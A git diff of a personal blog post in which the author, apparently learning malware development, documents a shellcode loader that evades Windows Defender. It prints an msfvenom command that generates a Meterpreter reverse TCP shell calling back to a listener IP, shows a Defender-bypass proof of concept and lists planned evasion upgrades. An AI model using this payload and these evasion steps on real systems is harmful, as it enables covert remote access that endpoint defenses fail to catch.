@@ -154,31 +154,38 @@ Also, strings related to these calls do not appear in the `strings` section:
 
 ![](/images/post_images/firststeps_3.png)
 
-### TBD
+## Analyzing the loader with ThreatCheck
+[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) is an interesting tool designed by RastaMouse that allows us to **pinpoint the exact bytes that Windows Defender will flag** when scanning the file.
 
-Static analysis can also be based on specific byte sequences, or bad bytes in executables.
-NOte that PID the frist.
-The definition given by [MalwareBytes](https://www.malwarebytes.com/glossary/signature) of a malware signature is as follows:
+We can use this tool with our loader to verify if Defender flags our file:
+![](/images/post_images/firststeps_5.png)
 
-> In computer security, a signature is a specific pattern that allows cybersecurity technologies to recognize malicious threats, such as a byte sequence in network traffic or known malicious instruction sequences used by families of malware. Signature-based detection, then, is a methodology used by many cybersecurity companies to detect malware that has already been discovered in the wild and cataloged as part of a database.
+We can see that at first sight Defender does not seem to detect our loader.
 
-The phrase: “known malicious instruction sequences used by families of malware” is of particular interest, as it implies that security products are looking for specific byte sequences in executables and are able to identify them as malicious based on just those sequences.
+## Used shellcode
+The used shellcode is generated from `msfvenom` and it is a meterpreter reverse TCP shell. The shellcode used is **staged** and that means that it is lighter, but there is a download of the rest of the shellcode after the initial shellcode has been executed.
 
-This means that if we are able to accurately identify which byte sequences are being detected as malicious, we can replace them with benign bytes, and evade static detection.
+```bash
+msfvenom --platform windows --arch x64 -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.0.143 LPORT=443 -f raw -o meterpreter EXITFUNC=thread
+```
 
-Next, we can pass the executable into a decompiler such as [Ghidra](https://ghidra-sre.org/) and identify the code section that the byte sequence belongs to, we can jump to a memory offset using `G` and provide the offset as: `file ( OFFSET )`
+## Defender Bypass PoC
+Here is a video using this injector to load the previous shellcode with Defender on. Note that all of the functionalities of Defender are activated but the automatic sample submission (for obvious reasons):
 
-https://steve-s.gitbook.io/0xtriboulet/deceiving-defender/deceiving-defender-name-bypass
+`{{< video src="/images/post_videos/firststeps_poc.webm" type="video/webm" preload="auto" width="100%">}}`
 
-Stage: msfvenom --platform windows --arch x64 -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.0.143 LPORT=443 -f raw -o meterpreter EXITFUNC=thread
-Non-staged: msfvenom --platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.143 LPORT=443 -f raw -o meterpreter EXITFUNC=thread
+## Future research areas
+This post is just the start of a big project I have in hand. The main objective of my project is to understand how OS (specially Windows) works, and how EDR solutions work, in order to understand the most advanced EDR evasion techniques and how can I implement my own techniques to evade EDR using the OS facilities.
 
+I will update this injector when I discover more techniques, but here are some of the possible upgrade areas:
+- Change the injected shellcode for a custom one (IMHO I am far far away from developing a custom shellcode, but I am sure I will do it at the end)
+- Change the encryption algorithm used to a stronger one (RC6, for example).
+- Develop the injector in another language (C#, go, nim...).
+- Obtain the key to decrypt the resources from a server; this way, without proper connection to the server the injected shellcode does not work (ideal for EDRs that have a offline sandbox environment).
+- Overall, use more advanced evasion techniques (indirect syscalls, for example).
 
+I will start soon Sektor7 Malware Development Intermediate course and start reading Windows Internals book, to complement my knowledge.
 
+I hope you liked reading my post, feel free to contact me at any of my socials for any question/aclaration or just to give me tips, and I hope we see each other soon!
 
-ideas futuras
-cambiar el algoritmo de envcriptacion
-encriptar con clave en dominio 
-encriptar con clave de hostname, asi solo funciona en la target machine.
-cambiar los protocolos con los que hablarn (en generar, cambiar el agente xD)
-tecnicas mas avanzadas, indirect syscalls
+***jasco***
